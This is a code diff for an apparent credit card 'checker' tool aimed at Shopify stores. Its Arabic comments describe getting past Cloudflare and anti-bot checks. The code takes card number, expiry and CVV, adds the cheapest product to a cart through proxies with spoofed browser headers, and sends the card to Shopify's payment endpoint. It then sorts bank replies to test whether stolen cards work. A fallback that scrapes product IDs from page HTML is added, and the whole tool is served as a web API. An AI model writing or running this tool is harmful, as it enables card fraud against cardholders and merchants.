@@ -21,26 +21,41 @@ def safe_response(msg, price, gate):
     clean_price = str(price).replace('$', '').strip() if price else "-"
     return {"Response": clean_msg, "Price": clean_price, "Gate": gate}
 
-async def get_micro_product(session, store_url):
+async def get_unbreakable_product(session, store_url):
+    """محرك لا يقهر: يسحب أرخص منتج مهما كان سعره، وإذا فشل يسحبه من الـ HTML مباشرة"""
     endpoints = [f"{store_url}/products.json?limit=250", f"{store_url}/collections/all/products.json?limit=250"]
+    all_variants = []
+    
+    # المحاولة الأولى: سحب المنتجات بشكل رسمي
     for ep in endpoints:
         try:
-            res = await session.get(ep, headers={"Accept": "application/json"}, timeout=15)
+            res = await session.get(ep, headers={"Accept": "application/json"}, timeout=10)
             if res.status_code == 200:
                 products = res.json().get('products', [])
-                valid = []
                 for prod in products:
                     for var in prod.get('variants', []):
                         if var.get('available'):
                             try:
                                 p = float(var.get('price', 0))
                                 if p > 10000: p = p / 100.0
-                                if 0.1 <= p <= 150.0: valid.append((var.get('id'), p))
+                                if p > 0: all_variants.append((var.get('id'), p))
                             except: pass
-                if valid:
-                    valid.sort(key=lambda x: x[1])
-                    return str(valid[0][0]), "{:.2f}".format(valid[0][1])
         except: continue
+        if all_variants: break
+
+    if all_variants:
+        all_variants.sort(key=lambda x: x[1])
+        # سحب أرخص منتج متاح حرفياً بدون أي شروط غبية
+        return str(all_variants[0][0]), "{:.2f}".format(all_variants[0][1])
+
+    # المحاولة الثانية (نظام الطوارئ): سحب الـ ID من كود الصفحة لو الـ API مغلق
+    try:
+        html_res = await session.get(store_url, timeout=10)
+        matches = re.findall(r'variant[s]?["\']?\s*:\s*\[.*?["\']?id["\']?\s*:\s*(\d+)', html_res.text, re.IGNORECASE)
+        if matches:
+            return str(matches[0]), "Fallback"
+    except: pass
+
     return None, "-"
 
 def extract_advanced_tokens(html, url):
@@ -73,10 +88,10 @@ def extract_advanced_tokens(html, url):
 
     return is_graphql, session_token, classic_token, checkout_token
 
-async def check_shopify_raw(cc_info, store_url, proxy):
+async def check_shopify_vmax(cc_info, store_url, proxy):
     try:
         cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
-        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Engine")
+        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify V-Max")
         cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
         if len(yy) == 2: yy = "20" + yy
 
@@ -89,37 +104,31 @@ async def check_shopify_raw(cc_info, store_url, proxy):
             "address1": "123 Main Street", "city": "New York", "province": "NY", "zip": "10001", "country": "US", "phone": "2125551234"
         }
 
-        # تم إزالة impersonate بالكامل للاعتماد على سلوك الطلبات العادية كما في neww.py
+        # تخطي Cloudflare عبر إزالة impersonate واستخدام الطلب المباشر كما في neww.py
         async with AsyncSession(proxies=proxies, verify=False, timeout=60) as session:
             
-            # 1. سحب المنتج
-            variant_id, price = await get_micro_product(session, store_url)
-            if not variant_id: return safe_response("No micro-priced product found", "-", "Shopify Engine")
+            # 1. سحب المنتج (بدون شروط توقف العملية)
+            variant_id, price = await get_unbreakable_product(session, store_url)
+            if not variant_id: return safe_response("Store has no active variants", "-", "Shopify V-Max")
 
-            # 2. الإضافة للسلة بطريقة عادية
-            add_headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                "X-Requested-With": "XMLHttpRequest"
-            }
+            # 2. الإضافة للسلة 
+            add_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "X-Requested-With": "XMLHttpRequest"}
             add_res = await session.post(f"{store_url}/cart/add.js", data={"id": variant_id, "quantity": "1"}, headers=add_headers)
-            if add_res.status_code not in [200, 201]: return safe_response("Anti-Bot Blocked Cart Add", price, "Shopify Engine")
+            if add_res.status_code not in [200, 201]: return safe_response("Anti-Bot Blocked Cart Add", price, "Shopify V-Max")
 
             await asyncio.sleep(0.5)
 
-            # 3. فتح صفحة الدفع بطلب عادي بدون ترويسات تزوير تثير كلاودفلير
-            chk_headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
-            }
+            # 3. طلب صفحة الدفع
+            chk_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
             res_chk = await session.get(f"{store_url}/checkout", allow_redirects=True, headers=chk_headers)
             html_chk = res_chk.text
             final_url = str(res_chk.url)
 
             if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
-                return safe_response("Cloudflare WAF Blocked IP", price, "Shopify Engine")
+                return safe_response("Cloudflare WAF Blocked IP", price, "Shopify V-Max")
             
             if "/cart" in final_url and "/checkout" not in final_url:
-                return safe_response("Cart Blocked (Item Removed)", price, "Shopify Engine")
+                return safe_response("Cart Blocked (Item Removed)", price, "Shopify V-Max")
 
             # 4. الرادار الجزيئي للتوكن
             is_graphql, session_token, classic_token, checkout_token = extract_advanced_tokens(html_chk, final_url)
@@ -127,19 +136,16 @@ async def check_shopify_raw(cc_info, store_url, proxy):
             if not is_graphql and not classic_token:
                 title = re.search(r'<title>([^<]+)</title>', html_chk)
                 page_title = title.group(1).strip() if title else "Unknown"
-                return safe_response(f"Token Extractor Failed ({page_title[:15]})", price, "Shopify Engine")
+                return safe_response(f"Token Extractor Failed ({page_title[:15]})", price, "Shopify V-Max")
 
             # 5. تشفير البطاقة
-            pci_headers = {
-                "Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json",
-                "User-Agent": chk_headers["User-Agent"]
-            }
+            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json", "User-Agent": chk_headers["User-Agent"]}
             res_pci = await session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
-            if res_pci.status_code != 200: return safe_response("Stripe PCI Blocked IP", price, "Shopify Engine")
+            if res_pci.status_code != 200: return safe_response("Stripe PCI Blocked IP", price, "Shopify V-Max")
             card_session_id = res_pci.json().get("id")
 
             # =================================================================
-            # المسار الأول: GraphQL Extensibility (للمتاجر الحديثة)
+            # المسار الأول: GraphQL Extensibility
             # =================================================================
             if is_graphql:
                 if not checkout_token: checkout_token = "unknown"
@@ -157,7 +163,7 @@ async def check_shopify_raw(cc_info, store_url, proxy):
                 prop_vars = {"delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]}, "sessionInput": {"sessionToken": session_token}}
                 res_prop = await session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
                 queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
-                if not queue_token: return safe_response("GraphQL Negotiate Failed", price, "Shopify Engine (GQL)")
+                if not queue_token: return safe_response("GraphQL Negotiate Failed", price, "Shopify V-Max (GQL)")
 
                 await asyncio.sleep(1)
 
@@ -170,10 +176,10 @@ async def check_shopify_raw(cc_info, store_url, proxy):
                 if rtype == 'SubmitRejected':
                     errs = res_sub.json().get('data', {}).get('submitForCompletion', {}).get('errors', [])
                     msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'System Rejected'
-                    return safe_response(msg, price, "Shopify Engine (GQL)")
+                    return safe_response(msg, price, "Shopify V-Max (GQL)")
 
                 receipt_id = res_sub.json().get('data', {}).get('submitForCompletion', {}).get('receipt', {}).get('id')
-                if not receipt_id: return safe_response("GraphQL Submit Failed", price, "Shopify Engine (GQL)")
+                if not receipt_id: return safe_response("GraphQL Submit Failed", price, "Shopify V-Max (GQL)")
 
                 poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
                 poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}...on ActionRequiredReceipt{id}}}"""
@@ -181,16 +187,16 @@ async def check_shopify_raw(cc_info, store_url, proxy):
                     res_poll = await session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                     if res_poll.status_code == 200:
                         p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
-                        if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify Engine (GQL)")
+                        if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify V-Max (GQL)")
                         elif p_type == 'FailedReceipt':
                             err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
-                            if "INSUFFICIENT" in err: return safe_response("Insufficient Funds", price, "Shopify Engine (GQL)")
-                            elif "CVC" in err: return safe_response("Incorrect CVC", price, "Shopify Engine (GQL)")
-                            elif "ZIP" in err or "ADDRESS" in err: return safe_response("ZIP Code Mismatch", price, "Shopify Engine (GQL)")
-                            elif "DO_NOT_HONOR" in err: return safe_response("Do Not Honor", price, "Shopify Engine (GQL)")
-                            return safe_response(f"Declined: {err}", price, "Shopify Engine (GQL)")
+                            if "INSUFFICIENT" in err: return safe_response("Insufficient Funds", price, "Shopify V-Max (GQL)")
+                            elif "CVC" in err: return safe_response("Incorrect CVC", price, "Shopify V-Max (GQL)")
+                            elif "ZIP" in err or "ADDRESS" in err: return safe_response("ZIP Code Mismatch", price, "Shopify V-Max (GQL)")
+                            elif "DO_NOT_HONOR" in err: return safe_response("Do Not Honor", price, "Shopify V-Max (GQL)")
+                            return safe_response(f"Declined: {err}", price, "Shopify V-Max (GQL)")
                     await asyncio.sleep(1.5)
-                return safe_response("Timeout waiting for Bank", price, "Shopify Engine (GQL)")
+                return safe_response("Timeout waiting for Bank", price, "Shopify V-Max (GQL)")
             
             # =================================================================
             # المسار الثاني: Classic HTML (للمتاجر القديمة)
@@ -214,18 +220,18 @@ async def check_shopify_raw(cc_info, store_url, proxy):
                 res_pay = await session.post(str(res_ship.url), data=pay_payload, allow_redirects=True)
                 res_text = res_pay.text.lower()
                 
-                if "thank you" in res_text or "order completed" in res_text: return safe_response("Order completed 💎", price, "Shopify Engine (Classic)")
-                elif "insufficient" in res_text: return safe_response("Insufficient Funds", price, "Shopify Engine (Classic)")
-                elif "incorrect_cvc" in res_text or "security code" in res_text: return safe_response("Incorrect CVC", price, "Shopify Engine (Classic)")
-                elif "zip code" in res_text or "avs" in res_text: return safe_response("ZIP Code Mismatch", price, "Shopify Engine (Classic)")
-                elif "do not honor" in res_text: return safe_response("Do Not Honor", price, "Shopify Engine (Classic)")
+                if "thank you" in res_text or "order completed" in res_text: return safe_response("Order completed 💎", price, "Shopify V-Max (Classic)")
+                elif "insufficient" in res_text: return safe_response("Insufficient Funds", price, "Shopify V-Max (Classic)")
+                elif "incorrect_cvc" in res_text or "security code" in res_text: return safe_response("Incorrect CVC", price, "Shopify V-Max (Classic)")
+                elif "zip code" in res_text or "avs" in res_text: return safe_response("ZIP Code Mismatch", price, "Shopify V-Max (Classic)")
+                elif "do not honor" in res_text: return safe_response("Do Not Honor", price, "Shopify V-Max (Classic)")
                 else:
                     err = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
-                    return safe_response(err.group(1).strip() if err else "Declined / Gate Blocked", price, "Shopify Engine (Classic)")
+                    return safe_response(err.group(1).strip() if err else "Declined / Gate Blocked", price, "Shopify V-Max (Classic)")
 
     except Exception as e:
-        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify Engine")
+        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify V-Max")
 
 @app.get("/code/index.php")
 async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
-    return JSONResponse(content=await check_shopify_raw(cc, url, proxy))
+    return JSONResponse(content=await check_shopify_vmax(cc, url, proxy))
